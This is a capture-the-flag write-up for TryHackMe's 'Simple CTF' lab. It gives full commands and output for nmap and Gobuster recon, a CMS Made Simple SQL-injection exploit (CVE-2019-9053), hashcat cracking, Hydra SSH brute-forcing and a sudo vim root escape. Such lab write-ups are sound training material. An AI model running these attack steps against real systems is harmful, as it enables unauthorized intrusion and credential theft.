# THM: Simple CTF

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="../../images/write_ups/try_hack_me/simple_ctf/simple_ctf.png" alt="Simple CTF" width="90"/> |
| Room | Simple CTF |
| URL | https://tryhackme.com/room/easyctf |
| Difficulty | Easy |

## Concepts/Tools Used

- [ftp](../../tools/ftp.md)
- [Gobuster](../../tools/gobuster.md)
- [hashcat](../../tools/hashcat.md)
- [Hydra](../../tools/hydra.md)
- [Searchsploit](../../tools/searchsploit.md)

## Room Description

Beginner level ctf

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-19 04:44 BST
Nmap scan report for target.thm (10.10.24.46)
Host is up (0.00063s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.109.64
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
MAC Address: 02:CE:7E:E1:39:0F (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.44 seconds
```

## How manky services are running under port 1000?

The nmap output shows me that 2 services are running under port 1000.

## What is running on the higher port?

The ssh service is running on port 2222.

## What is the CVE you're using against the application?

I pull up the site running at http://target.thm and it is the default Apache2 page.

The nmap output above tells me that there is a directory at /openemr-5_0_1_3. I open that page and get a 404 error. I decided to run Gobuster:

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 309] [--> http://target.thm/simple/]
/server-status        (Status: 403) [Size: 298]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

I go to http://target.thm/simple. This brings up a page that talks about CMS Made Simple. It is running version 2.2.8. I run the following command to see if I can find a vulnerability:

```bash
$ searchsploit cms made simple 2.2.8
-------------------------------------------------- ---------------------------------
 Exploit Title                                    |  Path
-------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection          | php/webapps/46635.py
-------------------------------------------------- ---------------------------------
```

I copy the script to my directory using:

```bash
$ searchsploit -m 46635
```

This copies a file to my directory called 46635.py. Near the top of this file, it says that this script is based off CVE-2019-9053.

## To what kind of vulnerability is the application vulnerable?

Again, near the top of the 46635.py it says that this is for a SQL Injection attack, often called sqli.

This script was made using python 2 and that reached end of life January 2020. Since the attack box runs python 2, it is possible to run this script but I needed to install a dependency. The dependency is termcolor and the last version before 2020 was 1.1.0. Here is what I ran:

```bash
$ pip install termcolor==1.1.0
$ python 46635.py -u http://target.thm/simple/
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

## What's the password?

I saved the password and salt to a file with the following command:

```bash
$ echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" > hash.txt
```

I looked up the documentation for [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) and found that this is a mode 20 hash. I run the following command:

```bash
$ hashcat -m 20 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:REDACTED

Session..........: hashcat
Status...........: Cracked
...
```

The hashcat tool has cracked mitch's password. Now we have a username and password.

## Where can you login with the details obtained?

There is only one service we haven't tried anything with. I use the above password and the mitch username to login with ssh.

## Getting a Foothold

```bash
$ ssh mitch@target.thm -s 2222
```

I have a shell. I'm in!

## Easier Alternative Approach

The nmap output above, lets me know that the ftp server allows anonymous logins. I log into the ftp server with the command:

```bash
$ ftp target.thm
Connected to target.thm.
220 (vsFTPd 3.0.3)
Name (target.thm:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

I took a look around and found a file called ForMitch.txt. It has some interesting content. Here are the commands I ran and the output:

```bash
ftp> ls -lha
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -lha
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt -
remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
226 Transfer complete.
166 bytes received in 0.00 secs (100.3152 kB/s)
```

I found Mitch, a possible username and the "system" user has a weak password.

I tried to brute force mitch's password on the ssh service that is running on port 2222. Here is the command I ran:

```bash
$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt target.thm ssh -s 2222
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-19 04:53:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://target.thm:2222/
[2222][ssh] host: target.thm   login: mitch   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-19 04:53:42
```

Hydra was able to get mitch's password from the rockyou.txt file.

I logged in as mitch using the password that hydra found using the following command:

```bash
$ ssh mitch@target.thm -p 2222
```

I have a shell. I'm in!

## What's the user flag?

In mitch's home directory there is a user.txt file. I cat it with the following command:

```bash
$ cat user.txt
REDACTED
```

## Is there any other user in the home directory? What's its name?

I run the following command to find out:

```bash
$ ls /home
mitch  sunbath
```

## What can you leverage to spawn a privileged shell?

I ran my [usual list of commands](../../README.md#linux-privilege-escalation). Running sudo -l shows an interesting result:

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

## What's the root flag?

Vim has the ability to run commands within it. I can run vim with sudo and then create shell. Here is what I ran to start vim:

```bash
$ sudo vim
```

While in vim I run the following command to get a shell:

```bash
:!/bin/bash
```

It worked. I'm in! The cursor changed to the # character and the prompt reads root@Machine. I ran the following to get the flag:

```bash
# cat /root/root.txt
REDACTED
```
